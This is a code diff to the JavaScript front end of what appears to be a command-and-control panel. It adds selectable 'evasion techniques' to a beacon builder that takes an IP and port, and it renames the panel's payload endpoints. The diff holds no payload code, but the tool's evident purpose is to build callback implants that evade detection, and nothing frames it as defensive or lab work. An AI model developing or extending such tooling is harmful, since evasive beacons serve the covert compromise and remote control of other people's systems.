@@ -3,6 +3,7 @@ const app = {
     groups: [],
     currentView: 'dashboard',
     selectedTarget: null,
+    selectedEvasions: [],
     commandHistory: JSON.parse(localStorage.getItem('nexus_command_history') || '{}'),
 
     init() {
@@ -13,6 +14,7 @@ const app = {
         this.bindTerminal();
         this.bindGroupCreate();
         this.bindSearch();
+        this.bindEvasionCards();
         this.setupWebSocket();
         this.loadInitialData();
     },
@@ -729,15 +731,18 @@ const app = {
         const btn = document.getElementById('buildBtn');
         const status = document.getElementById('buildStatus');
 
+        // Collect selected evasion techniques
+        const evasions = this.selectedEvasions;
+
         btn.disabled = true;
         btn.textContent = 'Building...';
         status.innerHTML = '<div class="status-building"><span class="spinner-big"></span></div>';
 
         try {
-            const res = await fetch('api/payload.php?action=build', {
+            const res = await fetch('api/builder.php?action=build', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ ip, port })
+                body: JSON.stringify({ ip, port, evasions })
             });
             const data = await res.json();
 
@@ -757,7 +762,7 @@ const app = {
 
     async loadBeacons() {
         try {
-            const res = await fetch('api/payload.php?action=list');
+            const res = await fetch('api/builder.php?action=list');
             const data = await res.json();
             const container = document.getElementById('beaconList');
 
@@ -791,13 +796,13 @@ const app = {
     },
 
     downloadBeacon(name) {
-        window.location.href = 'api/payload.php?action=download&name=' + encodeURIComponent(name);
+        window.location.href = 'api/builder.php?action=download&name=' + encodeURIComponent(name);
     },
 
     async deleteBeacon(name) {
         if (!confirm('Delete ' + name + '?')) return;
         try {
-            await fetch('api/payload.php', {
+            await fetch('api/builder.php', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ action: 'delete', name: name })
@@ -936,6 +941,26 @@ const app = {
             alert('Error restarting server');
             this.checkServerStatus();
         }
+    },
+
+    bindEvasionCards() {
+        const grid = document.getElementById('evasionGrid');
+        if (!grid) return;
+
+        grid.querySelectorAll('.evasion-option').forEach(card => {
+            card.addEventListener('click', () => {
+                const evasion = card.dataset.evasion;
+                card.classList.toggle('active');
+
+                if (card.classList.contains('active')) {
+                    if (!this.selectedEvasions.includes(evasion)) {
+                        this.selectedEvasions.push(evasion);
+                    }
+                } else {
+                    this.selectedEvasions = this.selectedEvasions.filter(e => e !== evasion);
+                }
+            });
+        });
     }
 };
 
